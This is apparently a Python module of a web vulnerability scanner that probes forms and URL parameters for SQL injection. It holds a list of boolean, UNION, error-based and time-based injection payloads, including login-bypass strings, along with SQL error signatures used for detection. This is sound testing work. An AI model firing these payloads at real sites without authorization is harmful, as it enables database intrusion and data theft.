#!/usr/bin/env python3

import time
import urllib.parse
import requests
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from colorama import Fore, Style

class SQLIScanner:
    """Scanner for detecting SQL Injection vulnerabilities"""
    
    def __init__(self, scanner_instance):
        """
        Initialize the SQL Injection Scanner with a reference to the main scanner instance
        
        Args:
            scanner_instance: The main WebScanner instance
        """
        self.scanner = scanner_instance
        self.target_url = scanner_instance.target_url
        self.session = scanner_instance.session
        self.timeout = scanner_instance.timeout
        self.verbose = scanner_instance.verbose
        self.max_threads = scanner_instance.max_threads
        self.vulnerabilities = scanner_instance.vulnerabilities
        self.forms = scanner_instance.forms
        self.discovered_urls = scanner_instance.discovered_urls
        
        # SQL Injection payloads
        self.sqli_payloads = [
            # Boolean-based
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "\" OR \"1\"=\"1",
            "\" OR \"1\"=\"1\" --",
            "\" OR \"1\"=\"1\" /*",
            "OR 1=1",
            "OR 1=1--",
            "OR 1=1/*",
            "' OR 1=1 OR ''='",
            "admin' --",
            "admin' #",
            "admin'/*",
            
            # Error-based
            "'",
            "\"",
            "\\",
            "'\\",
            "\\\\",
            "';",
            "\";",
            "--",
            ";--",
            "';--",
            "\";--",
            "1'",
            "1\"",
            "1;",
            "1';",
            "1\";",
            "1\\",
            "1'\\",
            
            # UNION-based
            "' UNION SELECT 1,2,3,4 --",
            "' UNION SELECT null,null,null,null --",
            "\" UNION SELECT 1,2,3,4 --",
            "\" UNION SELECT null,null,null,null --",
            "' UNION ALL SELECT 1,2,3,4 --",
            "\" UNION ALL SELECT 1,2,3,4 --",
            
            # Time-based
            "' OR sleep(5) --",
            "\" OR sleep(5) --",
            "' OR pg_sleep(5) --",
            "\" OR pg_sleep(5) --",
            "' OR 1=1 AND sleep(5) --",
            "\" OR 1=1 AND sleep(5) --",
            "' AND sleep(5) --",
            "\" AND sleep(5) --",
            "' AND (SELECT * FROM (SELECT(sleep(5)))a) --",
            "\" AND (SELECT * FROM (SELECT(sleep(5)))a) --",
            "'; WAITFOR DELAY '0:0:5' --",
            "\"; WAITFOR DELAY '0:0:5' --"
        ]
        
        # SQL error indicators
        self.sqli_errors = [
            "sql syntax",
            "syntax error",
            "mysql_fetch",
            "mysql_num_rows",
            "mysql_query",
            "pg_query",
            "sql server",
            "microsoft sql",
            "postgresql",
            "sqlite",
            "oracle",
            "odbc",
            "mysql",
            "mariadb",
            "warning: mysql",
            "unclosed quotation mark",
            "unterminated string",
            "quoted string not properly terminated",
            "you have an error in your sql syntax",
            "division by zero",
            "supplied argument is not a valid mysql",
            "sqlstate[42000]",
            "sqlstate[23000]",
            "sqlstate[",
            "warning: pg_",
            "valid postgresql result",
            "pg_exec() [:",
            "unexpected end of sql command",
            "unexpected token",
            "sql command not properly ended",
            "incorrect syntax near",
            "unclosed quotation mark after the character string",
            "ora-01756",
            "ora-00936",
            "ora-00942",
            "ora-01789",
            "ora-",
            "db2 sql error"
        ]
    
    def test_form(self, form):
        """
        Test a single form for SQL injection vulnerabilities
        
        Args:
            form (dict): Form data containing action, method, and inputs
            
        Returns:
            list: List of vulnerabilities found
        """
        vulnerabilities = []
        
        for input_field in form.get('inputs', []):
            # Skip fields that are unlikely to be vulnerable (checkbox, radio, etc.)
            if input_field.get('type') in ['checkbox', 'radio', 'file', 'image']:
                continue
                
            # Test potentially vulnerable fields
            for payload in self.sqli_payloads:
                data = {}
                
                # Fill form fields
                for field in form.get('inputs', []):
                    if field.get('name') == input_field.get('name'):
                        data[field.get('name')] = payload
                    elif field.get('type') == 'email':
                        data[field.get('name')] = 'test@example.com'
                    elif field.get('type') == 'password':
                        data[field.get('name')] = 'Password123!'
                    else:
                        data[field.get('name')] = 'test'
                
                try:
                    start_time = time.time()
                    
                    if form.get('method', '').upper() == 'GET':
                        response = self.session.get(form.get('action', form['url']), params=data, timeout=self.timeout)
                    else:
                        response = self.session.post(form.get('action', form['url']), data=data, timeout=self.timeout)
                        
                    end_time = time.time()
                    response_time = end_time - start_time
                    
                    # Check for SQL error messages in the response
                    response_text = response.text.lower()
                    for error in self.sqli_errors:
                        if error in response_text:
                            vulnerability = {
                                'type': 'SQL Injection',
                                'url': form['url'],
                                'form_action': form.get('action', ''),
                                'method': form.get('method', ''),
                                'field': input_field.get('name'),
                                'payload': payload,
                                'indicator': error,
                                'severity': 'High',
                                'evidence': f"Response contains SQL error indicator: '{error}'"
                            }
                            vulnerabilities.append(vulnerability)
                            self.vulnerabilities.append(vulnerability)
                            
                            if self.verbose:
                                print(Fore.RED + f"[!] Potential SQL injection found at {form['url']} in field {input_field.get('name')}" + Style.RESET_ALL)
                                print(Fore.YELLOW + f"    Payload: {payload}" + Style.RESET_ALL)
                                print(Fore.YELLOW + f"    Indicator: {error}" + Style.RESET_ALL)
                            
                            # Found a vulnerability, no need to continue with other payloads for this input
                            return vulnerabilities
                    
                    # Check for time-based blind SQL injection
                    if ("sleep" in payload or "pg_sleep" in payload or "waitfor delay" in payload) and response_time > 4.5:
                        vulnerability = {
                            'type': 'SQL Injection',
                            'url': form['url'],
                            'form_action': form.get('action', ''),
                            'method': form.get('method', ''),
                            'field': input_field.get('name'),
                            'payload': payload,
                            'indicator': f"Time delay ({response_time:.2f}s)",
                            'severity': 'High',
                            'evidence': f"Potential time-based blind SQL injection: response time was {response_time:.2f}s with a sleep payload"
                        }
                        vulnerabilities.append(vulnerability)
                        self.vulnerabilities.append(vulnerability)
                        
                        if self.verbose:
                            print(Fore.RED + f"[!] Potential time-based blind SQL injection at {form['url']} in field {input_field.get('name')}" + Style.RESET_ALL)
                            print(Fore.YELLOW + f"    Payload: {payload}" + Style.RESET_ALL)
                            print(Fore.YELLOW + f"    Response time: {response_time:.2f}s" + Style.RESET_ALL)
                        
                        # Found a vulnerability, no need to continue with other payloads for this input
                        return vulnerabilities
                        
                except requests.exceptions.Timeout:
                    # Timeout might indicate a successful time-based SQL injection
                    if "sleep" in payload or "pg_sleep" in payload or "waitfor delay" in payload:
                        vulnerability = {
                            'type': 'SQL Injection',
                            'url': form['url'],
                            'form_action': form.get('action', ''),
                            'method': form.get('method', ''),
                            'field': input_field.get('name'),
                            'payload': payload,
                            'indicator': "Request timeout",
                            'severity': 'High',
                            'evidence': "Potential time-based blind SQL injection: request timed out with a sleep payload"
                        }
                        vulnerabilities.append(vulnerability)
                        self.vulnerabilities.append(vulnerability)
                        
                        if self.verbose:
                            print(Fore.RED + f"[!] Potential time-based blind SQL injection at {form['url']} in field {input_field.get('name')}" + Style.RESET_ALL)
                            print(Fore.YELLOW + f"    Payload: {payload}" + Style.RESET_ALL)
                            print(Fore.YELLOW + f"    Indicator: Request timed out" + Style.RESET_ALL)
                        
                        # Found a vulnerability, no need to continue with other payloads for this input
                        return vulnerabilities
                
                except Exception as e:
                    if self.verbose:
                        print(Fore.YELLOW + f"  [!] Error testing {form['url']}: {str(e)}" + Style.RESET_ALL)
                    continue
        
        return vulnerabilities
    
    def test_url_parameter(self, url):
        """
        Test URL parameters for SQL injection vulnerabilities
        
        Args:
            url (str): URL to test
            
        Returns:
            list: List of vulnerabilities found
        """
        vulnerabilities = []
        
        # Parse the URL to get query parameters
        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)
        
        # If there are no query parameters, return
        if not query_params:
            return vulnerabilities
            
        # Test each parameter with each SQL injection payload
        for param_name, param_values in query_params.items():
            original_value = param_values[0] if param_values else ''
            
            for payload in self.sqli_payloads:
                # Create a copy of the original query parameters
                modified_params = parse_qs(parsed_url.query)
                
                # Modify the target parameter
                modified_params[param_name] = [payload]
                
                # Rebuild the query string
                modified_query = urlencode(modified_params, doseq=True)
                
                # Reconstruct the URL
                modified_url = urlunparse((
                    parsed_url.scheme,
                    parsed_url.netloc,
                    parsed_url.path,
                    parsed_url.params,
                    modified_query,
                    parsed_url.fragment
                ))
                
                try:
                    start_time = time.time()
                    response = self.session.get(modified_url, timeout=self.timeout)
                    response_time = time.time() - start_time
                    
                    # Check for SQL error messages in the response
                    response_text = response.text.lower()
                    for error in self.sqli_errors:
                        if error in response_text:
                            vulnerability = {
                                'type': 'SQL Injection',
                                'url': url,
                                'parameter': param_name,
                                'payload': payload,
                                'indicator': error,
                                'severity': 'High',
                                'evidence': f"Response contains SQL error indicator: '{error}'"
                            }
                            vulnerabilities.append(vulnerability)
                            self.vulnerabilities.append(vulnerability)
                            
                            if self.verbose:
                                print(Fore.RED + f"[!] Potential SQL injection found at {url} in parameter {param_name}" + Style.RESET_ALL)
                                print(Fore.YELLOW + f"    Payload: {payload}" + Style.RESET_ALL)
                                print(Fore.YELLOW + f"    Indicator: {error}" + Style.RESET_ALL)
                            
                            # Found a vulnerability, move to the next parameter
                            break
                    
                    # Check for time-based blind SQL injection
                    if ("sleep" in payload or "pg_sleep" in payload or "waitfor delay" in payload) and response_time > 4.5:
                        vulnerability = {
                            'type': 'SQL Injection',
                            'url': url,
                            'parameter': param_name,
                            'payload': payload,
                            'indicator': f"Time delay ({response_time:.2f}s)",
                            'severity': 'High',
                            'evidence': f"Potential time-based blind SQL injection: response time was {response_time:.2f}s with a sleep payload"
                        }
                        vulnerabilities.append(vulnerability)
                        self.vulnerabilities.append(vulnerability)
                        
                        if self.verbose:
                            print(Fore.RED + f"[!] Potential time-based blind SQL injection at {url} in parameter {param_name}" + Style.RESET_ALL)
                            print(Fore.YELLOW + f"    Payload: {payload}" + Style.RESET_ALL)
                            print(Fore.YELLOW + f"    Response time: {response_time:.2f}s" + Style.RESET_ALL)
                        
                        # Found a vulnerability, move to the next parameter
                        break
                        
                except requests.exceptions.Timeout:
                    # Timeout might indicate a successful time-based SQL injection
                    if "sleep" in payload or "pg_sleep" in payload or "waitfor delay" in payload:
                        vulnerability = {
                            'type': 'SQL Injection',
                            'url': url,
                            'parameter': param_name,
                            'payload': payload,
                            'indicator': "Request timeout",
                            'severity': 'High',
                            'evidence': "Potential time-based blind SQL injection: request timed out with a sleep payload"
                        }
                        vulnerabilities.append(vulnerability)
                        self.vulnerabilities.append(vulnerability)
                        
                        if self.verbose:
                            print(Fore.RED + f"[!] Potential time-based blind SQL injection at {url} in parameter {param_name}" + Style.RESET_ALL)
                            print(Fore.YELLOW + f"    Payload: {payload}" + Style.RESET_ALL)
                            print(Fore.YELLOW + f"    Indicator: Request timed out" + Style.RESET_ALL)
                        
                        # Found a vulnerability, move to the next parameter
                        break
                        
                except Exception as e:
                    if self.verbose:
                        print(Fore.YELLOW + f"  [!] Error testing {url}: {str(e)}" + Style.RESET_ALL)
                    continue
        
        return vulnerabilities
    
    def run(self):
        """
        Test for SQL injection vulnerabilities in forms and URL parameters
        
        Returns:
            int: Number of SQL injection vulnerabilities found
        """
        sqli_count = sum(1 for v in self.vulnerabilities if v.get('type') == 'SQL Injection')
        
        if self.verbose:
            print(Fore.BLUE + "[*] Testing for SQL injection vulnerabilities..." + Style.RESET_ALL)
        
        # Test forms for SQL injection
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            results = list(executor.map(self.test_form, self.forms))
        
        # Test URL parameters for SQL injection
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            url_results = list(executor.map(self.test_url_parameter, self.discovered_urls))
        
        # Count how many SQL injection vulnerabilities were found
        sql_vulnerabilities = sum(1 for v in self.vulnerabilities if v.get('type') == 'SQL Injection')
        sql_vulnerabilities_found = sql_vulnerabilities - sqli_count
        
        print(Fore.GREEN + f"[+] Completed SQL injection testing, found {sql_vulnerabilities_found} vulnerabilities" + Style.RESET_ALL)
        return sql_vulnerabilities_found 